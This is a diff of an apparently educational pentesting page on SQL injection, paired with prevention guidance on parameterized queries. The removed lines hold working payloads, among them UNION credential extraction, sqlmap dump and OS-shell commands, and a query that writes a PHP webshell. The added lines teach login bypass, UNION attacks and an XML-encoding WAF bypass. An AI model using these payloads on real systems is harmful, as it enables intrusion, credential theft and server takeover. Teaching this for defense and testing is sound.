@@ -3,114 +3,220 @@ title: "SQL Injection"
 description: "From data extraction to OS command execution — SQL injection techniques and methodology."
 ---
 
-SQL Injection occurs when **user-supplied input is embedded directly into SQL queries** without proper sanitization, allowing an attacker to manipulate the query logic.
+## Injection Points
 
-## Detecting SQLi
+While most SQLi occurs in WHERE clauses, vulnerabilities can appear anywhere in a query:
 
-```bash
-# Manual probing — look for errors or behavioral changes
-'
-''
-`
-')
-"))
-' OR '1'='1
-' OR 1=1--
-" OR "1"="1
-```
-
-## Types of SQLi
-
-| Type | Description |
+| Location | Example |
 |---|---|
-| **In-band (Error)** | Error messages reveal DB info |
-| **In-band (Union)** | UNION SELECT extracts data |
-| **Blind (Boolean)** | True/false conditions reveal data |
-| **Blind (Time)** | `SLEEP()` / `WAITFOR` based |
-| **Out-of-band** | DNS/HTTP exfiltration |
+| UPDATE | Updated values or WHERE clause |
+| INSERT | Inserted values |
+| SELECT | Table/column name, ORDER BY clause |
 
-## Union-Based Extraction
+### Attack Types
+
+- Retrieving hidden data — modify a query to return additional results
+- Subverting application logic — alter query behavior to bypass checks
+- UNION attacks — pull data from other tables
+- Blind SQLi — exploit queries whose results aren't directly returned
+
+### Example: Retrieving Hidden Data
+
+Original request and query:
+
+```
+GET /products?category=Gifts
+SELECT * FROM products WHERE category = 'Gifts' AND released = 1
+```
+
+Attack 1 — comment out the rest:
+
+```
+/products?category=Gifts'--
+SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
+```
+
+Attack 2 — return all rows:
+
+```
+/products?category=Gifts'+OR+1=1--
+SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
+```
+
+`OR 1=1` makes the WHERE clause always true; `--` discards the trailing conditions. Result: all products returned, including unreleased ones.
+
+### Subverting Application Logic
+
+A typical login query:
 
 ```sql
--- Find number of columns
-' ORDER BY 1--
-' ORDER BY 2--
-' ORDER BY 3--   -- error means 3 columns exist
-
--- Find injectable column
-' UNION SELECT NULL,NULL,NULL--
-' UNION SELECT 'a',NULL,NULL--
-
--- Extract database info
-' UNION SELECT user(),database(),version()--
-
--- Extract tables
-' UNION SELECT table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database()--
-
--- Extract columns
-' UNION SELECT column_name,NULL,NULL FROM information_schema.columns WHERE table_name='users'--
-
--- Extract data
-' UNION SELECT username,password,NULL FROM users--
+SELECT * FROM users WHERE username = 'wiener' AND password = 'bluecheese'
 ```
 
-## Boolean-Based Blind
+By submitting `administrator'--` as the username (with a blank password), the query becomes:
 
 ```sql
--- Confirm vulnerability
-' AND 1=1--   # True → normal response
-' AND 1=2--   # False → different response
-
--- Extract data character by character
-' AND SUBSTRING(username,1,1)='a' FROM users WHERE id=1--
+SELECT * FROM users WHERE username = 'administrator'--' AND password = ''
 ```
 
-## Time-Based Blind
+`--` comments out the password check entirely, so the attacker logs in as administrator with no password required.
+
+### Retrieving Data from Other Tables
+
+Using the UNION keyword, an attacker can append a second SELECT to an existing query and pull data from entirely different tables.
+
+Original query:
 
 ```sql
--- MySQL
-' AND SLEEP(5)--
-
--- MSSQL
-'; WAITFOR DELAY '0:0:5'--
-
--- PostgreSQL
-'; SELECT pg_sleep(5)--
+SELECT name, description FROM products WHERE category = 'Gifts'
 ```
 
-## sqlmap
-
-```bash
-# Basic scan
-sqlmap -u "http://target.com/page?id=1"
-
-# POST request
-sqlmap -u "http://target.com/login" --data="user=admin&pass=test"
-
-# With request file from Burp
-sqlmap -r request.txt
-
-# Dump database
-sqlmap -u "http://target.com/page?id=1" --dump
-
-# OS shell (if privileged)
-sqlmap -u "http://target.com/page?id=1" --os-shell
-```
-
-<Tip>
-  Always use `--level=5 --risk=3` for thorough testing, and `--dbms=mysql` when you know the backend to speed up detection.
-</Tip>
-
-## File Read/Write (MySQL)
+Injecting `' UNION SELECT username, password FROM users--` produces:
 
 ```sql
--- Read a file
-' UNION SELECT LOAD_FILE('/etc/passwd'),NULL,NULL--
-
--- Write a webshell
-' UNION SELECT "<?php system($_GET['cmd']); ?>",NULL,NULL INTO OUTFILE '/var/www/html/shell.php'--
+SELECT name, description FROM products WHERE category = 'Gifts'
+UNION SELECT username, password FROM users--
 ```
 
-<Warning>
-  File write requires `FILE` privilege and the MySQL user must have write access to the web root.
-</Warning>
+The response now includes all usernames and passwords alongside the normal product results.
+
+### Blind SQL Injection
+
+With blind SQLi, the application doesn't return query results or error details — but the vulnerability can still be exploited. Techniques include:
+
+- **Boolean-based** — inject a condition that changes the app's response depending on whether it's true or false (e.g. injecting into Boolean logic or triggering a divide-by-zero error)
+- **Time-based** — conditionally trigger a time delay; infer truth from how long the app takes to respond
+- **Out-of-band (OAST)** — trigger an external network interaction (e.g. a DNS lookup to a domain you control) to exfiltrate data directly; useful when other techniques fail
+
+## Second-Order SQL Injection
+
+First-order SQLi is straightforward — user input from an HTTP request is immediately incorporated into a SQL query unsafely.
+
+Second-order (aka stored) SQLi is more subtle: the application stores the user input safely at first, but later retrieves it and incorporates it into a query unsafely. The vulnerability isn't at the point of storage — it triggers on a completely different HTTP request down the line.
+
+<img src="https://dudji.gitbook.io/hackbook/~gitbook/image?url=https%3A%2F%2F2166287169-files.gitbook.io%2F%7E%2Ffiles%2Fv0%2Fb%2Fgitbook-x-prod.appspot.com%2Fo%2Fspaces%252FaLYdKLEEzXaL0ACxZZHt%252Fuploads%252FeYoKCvvW5ZC8IS3Sia9g%252Fimage.png%3Falt%3Dmedia%26token%3Dc2ec0014-53e1-40c3-af1a-ed3254bbb84d&width=768&dpr=3&quality=100&sign=d5379125&sv=2" alt="Second-order SQL injection diagram" />
+
+## Examining the Database
+
+SQL behaves differently across platforms — techniques that work on MySQL may not work on Oracle. Key differences include syntax for string concatenation, comments, batched queries, platform-specific APIs, and error messages.
+
+Once a vulnerability is confirmed, fingerprinting the database helps tailor the attack. Two useful starting points:
+
+Version detection (result reveals DB type):
+
+```sql
+SELECT * FROM v$version  -- Oracle
+```
+
+List all tables:
+
+```sql
+SELECT * FROM information_schema.tables  -- Most databases
+```
+
+### SQL Injection in Different Contexts
+
+SQLi isn't limited to query strings — any input processed as SQL is a potential vector, including JSON and XML bodies.
+
+These formats can also help bypass WAFs: filters that block keywords like `SELECT` can often be evaded by encoding or escaping characters. For example, encoding the `S` in `SELECT` as an XML escape sequence:
+
+```xml
+<stockCheck>
+    <productId>123</productId>
+    <storeId>999 &#x53;ELECT * FROM information_schema.tables</storeId>
+</stockCheck>
+```
+
+The server decodes `&#x53;` back to `S` before passing it to the SQL interpreter — bypassing the filter while executing normally.
+
+### How to Prevent SQL Injection
+
+The fix for most SQLi is parameterized queries (aka prepared statements) — never concatenate user input directly into a query.
+
+Vulnerable:
+
+```java
+String query = "SELECT * FROM products WHERE category = '" + input + "'";
+Statement statement = connection.createStatement();
+ResultSet resultSet = statement.executeQuery(query);
+```
+
+Safe:
+
+```java
+PreparedStatement statement = connection.prepareStatement(
+    "SELECT * FROM products WHERE category = ?"
+);
+statement.setString(1, input);
+ResultSet resultSet = statement.executeQuery();
+```
+
+Parameterized queries work for WHERE, INSERT, and UPDATE values — but can't handle table/column names or ORDER BY clauses. For those, use:
+
+- Whitelisting permitted input values
+- Different logic to deliver the required behavior
+
+One critical rule: the query string must always be a hard-coded constant — never mix in variable data of any origin, even if you think it's safe. It's easy to misjudge the origin of data, or for future code changes to introduce tainted input into what was once a trusted path.
+
+### Examining the Database
+
+#### Querying Version & Type
+
+Inject provider-specific version queries to fingerprint the database:
+
+| Database | Query |
+|---|---|
+| Microsoft, MySQL | `SELECT @@version` |
+| Oracle | `SELECT * FROM v$version` |
+| PostgreSQL | `SELECT version()` |
+
+Using a UNION attack:
+
+```sql
+' UNION SELECT @@version--
+```
+
+A response like the below confirms **Microsoft SQL Server** and reveals the exact version:
+
+```
+Microsoft SQL Server 2016 (SP2) (KB4052908) - 13.0.5026.0 (X64)
+Mar 18 2018 09:11:49 Copyright (c) Microsoft Corporation
+Standard Edition (64-bit) on Windows Server 2016 Standard 10.0
+```
+
+## Listing Database Contents
+
+Query `information_schema.tables` to list all tables:
+
+```sql
+SELECT * FROM information_schema.tables
+```
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  TABLE_TYPE
+=====================================================
+MyDatabase     dbo           Products    BASE TABLE
+MyDatabase     dbo           Users       BASE TABLE
+MyDatabase     dbo           Feedback    BASE TABLE
+```
+
+Then drill into a specific table with `information_schema.columns`:
+
+```sql
+SELECT * FROM information_schema.columns WHERE table_name = 'Users'
+```
+
+```
+TABLE_CATALOG  TABLE_SCHEMA  TABLE_NAME  COLUMN_NAME  DATA_TYPE
+=================================================================
+MyDatabase     dbo           Users       UserId       int
+MyDatabase     dbo           Users       Username     varchar
+MyDatabase     dbo           Users       Password     varchar
+```
+
+Oracle doesn't have `information_schema` — use these equivalents instead:
+
+```sql
+SELECT * FROM all_tables                                    -- list tables
+SELECT * FROM all_tab_columns WHERE table_name = 'USERS'   -- list columns
+```
